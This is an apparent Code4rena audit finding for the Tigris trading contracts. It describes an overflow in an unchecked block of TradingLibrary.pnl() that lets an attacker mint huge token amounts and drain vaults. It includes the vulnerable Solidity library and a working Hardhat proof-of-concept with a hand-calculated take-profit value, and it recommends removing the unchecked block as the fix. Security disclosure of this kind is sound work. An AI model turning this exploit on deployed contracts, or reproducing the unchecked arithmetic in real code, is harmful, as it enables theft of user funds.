{
  "Title": "[H-03] Certain fee configuration enables vaults to be drained",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/utils/TradingLibrary.sol#L46\n\n\n# Vulnerability details\n\n# Certain fee configuration enables vaults to be drained\n\n### Summary\nAn overflow in `TradingLibrary.pnl()` enables all funds from the vault contracts to be drained given a certain fee configuration is present.\n\n\n### Detailed exploit process description\nWhen opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in an `unchecked` block. Setting this value specifically to attack the vault leads to the `Trading` contract minting a huge (in the example below `10^36`) Tigris tokens, which can then be given to the vault to withdraw assets.\n\nThe exploiter starts by setting himself as referrer, in order to later receive the referrer fees. \nThe next step is to open a short position at the current market price by calling `initiateLimitOrder()`. Here, the malicious value which will later bring the arithmetic to overflow is passed in as take-profit price. For the example below, the value has been calculated by hand to be `115792089237316195423570985008687907854269984665640564039467` for this specific market price, leverage and margin. \nThe order is then immediately executed through `executeLimitOrder()`.\nThe final step is to close the order through `limitClose()`, which will then mint over `10^36` Tigris tokens to the attacker.\n\n\n### Detailed bug description\nThe bug takes place in `TradingLibrary.pnl()`, line 46. The function is called during the process of closing the order to calculate the payout and position size. The malicious take-profit is passed as `_currentPrice` and the order's original opening price is passed as `_price`. The take-profit has been specifically calculated so that `1e18 * _currentPrice / _price - 1e18` results in `0`, meaning `_payout = _margin` (`accInterest` is negligible for this PoC).\nLine 48 then calculates the position size. Margin and leverage have been chosen so that `_initPositionSize * _currentPrice` does not overflow, resulting in a huge `_positionSize` which is returned from the function.\n\nLater, `Trading._handleCloseFees()` is called, under the condition that `_payout > 0`, which is why the overflow had to be calculated so precisely, as to not subtract from the `_payout` but still create a large `_positionSize`. `_positionSize` is passed in to this function, and it is used to calculate DAO and referral fees. Line 805 is what requires the specific fee configuration to be present, as otherwise this line would revert. The fees have to be `daoFees = 2*referralFees` -- not exactly, but close to this relationship. Then line 792 will set the DAO fees close to zero, while the huge `referralFees` are directly minted and not included in the calculation in line 805.\n\n\n### Recommended mitigation\nThe core issue is that the arithmetic in `TradingLibrary.pnl()` overflows. I recommend removing the `unchecked` block.\n\n\n\n### PoC\nInsert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`:\n```javascript\ndescribe(\"PoC\", function () {\n    it.only(\"PoC\", async function () {\n      // Setup token balances and approvals\n      const mockDAI = await ethers.getContractAt(\"MockERC20\", MockDAI.address)\n      await mockDAI.connect(owner).transfer(user.address, parseEther(\"10000\"))\n      await mockDAI.connect(user).approve(trading.address, parseEther(\"10000\"))\n      const permitData = [\n        \"0\",\n        \"0\",\n        \"0\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        false\n      ]\n\n      // Create referral code\n      await referrals.connect(user).createReferralCode(ethers.constants.HashZero)\n\n      // Set the fees\n      await trading.connect(owner).setFees(\n        false,        // close\n        \"200000000\",  // dao  \n        \"0\",          // burn\n        \"100000000\",  // referral\n        \"0\",          // bot\n        \"0\",          // percent\n      )\n\n\n      // ============================================================== //\n      // =================== Create the limit order =================== //\n      // ============================================================== //\n      const tradeInfo = [\n        parseEther(\"1\"),          // margin amount\n        MockDAI.address,          // margin asset\n        StableVault.address,      // stable vault\n        parseEther(\"2\"),          // leverage\n        0,                        // asset id\n        false,                    // direction (short)\n        \"115792089237316195423570985008687907854269984665640564039467\",          // take profit price\n        parseEther(\"0\"),       // stop loss price\n        ethers.constants.HashZero // referral (ourself)\n      ];\n\n      // Create the order\n      await trading.connect(user).initiateLimitOrder(\n        tradeInfo,            // trade info\n        1,                    // order type (limit)\n        parseEther(\"1000\"),   // price\n        permitData,           // permit\n        user.address          // trader\n      )\n\n\n      // ============================================================== //\n      // =================== Execute the limit order ================== //\n      // ============================================================== //\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", [10])\n      await network.provider.send(\"evm_mine\")\n\n      // Create the price data\n      let priceData = [\n        node.address,                                   // provider\n        0,                                              // asset id\n        parseEther(\"1000\"),                             // price\n        10000000,                                       // spread (0.1%)\n        (await ethers.provider.getBlock()).timestamp,   // timestamp\n        false                                           // is closed\n      ]\n\n      // Sign the price data\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      )\n\n      // Execute the limit order\n      await trading.connect(user).executeLimitOrder(1, priceData, sig);\n\n\n\n\n\n      // ============================================================== //\n      // ======================== Close order  ======================== //\n      // ============================================================== //\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", [10])\n      await network.provider.send(\"evm_mine\")\n\n      // Close order\n      await trading.connect(user).limitClose(\n        1,          // id\n        true,       // take profit\n        priceData,  // price data\n        sig,        // signature\n      )\n\n      // Print results\n      const amount = await stabletoken.balanceOf(user.address)\n      const tenPow18 = \"1000000000000000000\"\n      console.log(`StableToken balance at end: ${(amount / tenPow18).toString()}`)\n    })\n})\n```",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-12-tigris-trade-contest",
  "Code": [
    {
      "filename": "contracts/utils/TradingLibrary.sol",
      "content": "//SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\nimport \"../interfaces/IPosition.sol\";\n\ninterface IPrice {\n    function latestAnswer() external view returns (int256);\n    function decimals() external view returns (uint256);\n}\n\nstruct PriceData {\n    address provider;\n    uint256 asset;\n    uint256 price;\n    uint256 spread;\n    uint256 timestamp;\n    bool isClosed;\n}\n\nlibrary TradingLibrary {\n\n    using ECDSA for bytes32;\n\n    /**\n    * @notice returns position profit or loss\n    * @param _direction true if long\n    * @param _currentPrice current price\n    * @param _price opening price\n    * @param _leverage position leverage\n    * @param _margin collateral amount\n    * @param accInterest funding fees\n    * @return _positionSize position size\n    * @return _payout payout trader should get\n    */\n    function pnl(bool _direction, uint _currentPrice, uint _price, uint _margin, uint _leverage, int256 accInterest) external pure returns (uint256 _positionSize, int256 _payout) {\n        unchecked {\n            uint _initPositionSize = _margin * _leverage / 1e18;\n            if (_direction && _currentPrice >= _price) {\n                _payout = int256(_margin) + int256(_initPositionSize * (1e18 * _currentPrice / _price - 1e18)/1e18) + accInterest;\n            } else if (_direction && _currentPrice < _price) {\n                _payout = int256(_margin) - int256(_initPositionSize * (1e18 - 1e18 * _currentPrice / _price)/1e18) + accInterest;\n            } else if (!_direction && _currentPrice <= _price) {\n                _payout = int256(_margin) + int256(_initPositionSize * (1e18 - 1e18 * _currentPrice / _price)/1e18) + accInterest;\n            } else {\n                _payout = int256(_margin) - int256(_initPositionSize * (1e18 * _currentPrice / _price - 1e18)/1e18) + accInterest;\n            }\n            _positionSize = _initPositionSize * _currentPrice / _price;\n        }\n    }\n\n    /**\n    * @notice returns position liquidation price\n    * @param _direction true if long\n    * @param _tradePrice opening price\n    * @param _leverage position leverage\n    * @param _margin collateral amount\n    * @param _accInterest funding fees\n    * @param _liqPercent liquidation percent\n    * @return _liqPrice liquidation price\n    */\n    function liqPrice(bool _direction, uint _tradePrice, uint _leverage, uint _margin, int _accInterest, uint _liqPercent) public pure returns (uint256 _liqPrice) {\n        if (_direction) {\n            _liqPrice = _tradePrice - ((_tradePrice*1e18/_leverage) * uint(int(_margin)+_accInterest) / _margin) * _liqPercent / 1e10;\n        } else {\n            _liqPrice = _tradePrice + ((_tradePrice*1e18/_leverage) * uint(int(_margin)+_accInterest) / _margin) * _liqPercent / 1e10;\n        }\n    }\n\n    /**\n    * @notice uses liqPrice() and returns position liquidation price\n    * @param _positions positions contract address\n    * @param _id position id\n    * @param _liqPercent liquidation percent\n    */\n    function getLiqPrice(address _positions, uint _id, uint _liqPercent) external view returns (uint256) {\n        IPosition.Trade memory _trade = IPosition(_positions).trades(_id);\n        return liqPrice(_trade.direction, _trade.price, _trade.leverage, _trade.margin, _trade.accInterest, _liqPercent);\n    }\n\n    /**\n    * @notice verifies that price is signed by a whitelisted node\n    * @param _validSignatureTimer seconds allowed before price is old\n    * @param _asset position asset\n    * @param _chainlinkEnabled is chainlink verification is on\n    * @param _chainlinkFeed address of chainlink price feed\n    * @param _priceData PriceData object\n    * @param _signature signature returned from oracle\n    * @param _isNode mapping of allowed nodes\n    */\n    function verifyPrice(\n        uint256 _validSignatureTimer,\n        uint256 _asset,\n        bool _chainlinkEnabled,\n        address _chainlinkFeed,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        mapping(address => bool) storage _isNode\n    )\n        external view\n    {\n        address _provider = (\n            keccak256(abi.encode(_priceData))\n        ).toEthSignedMessageHash().recover(_signature);\n        require(_provider == _priceData.provider, \"BadSig\");\n        require(_isNode[_provider], \"!Node\");\n        require(_asset == _priceData.asset, \"!Asset\");\n        require(!_priceData.isClosed, \"Closed\");\n        require(block.timestamp >= _priceData.timestamp, \"FutSig\");\n        require(block.timestamp <= _priceData.timestamp + _validSignatureTimer, \"ExpSig\");\n        require(_priceData.price > 0, \"NoPrice\");\n        if (_chainlinkEnabled && _chainlinkFeed != address(0)) {\n            int256 assetChainlinkPriceInt = IPrice(_chainlinkFeed).latestAnswer();\n            if (assetChainlinkPriceInt != 0) {\n                uint256 assetChainlinkPrice = uint256(assetChainlinkPriceInt) * 10**(18 - IPrice(_chainlinkFeed).decimals());\n                require(\n                    _priceData.price < assetChainlinkPrice+assetChainlinkPrice*2/100 &&\n                    _priceData.price > assetChainlinkPrice-assetChainlinkPrice*2/100, \"!chainlinkPrice\"\n                );\n            }\n        }\n    }\n}"
    }
  ]
}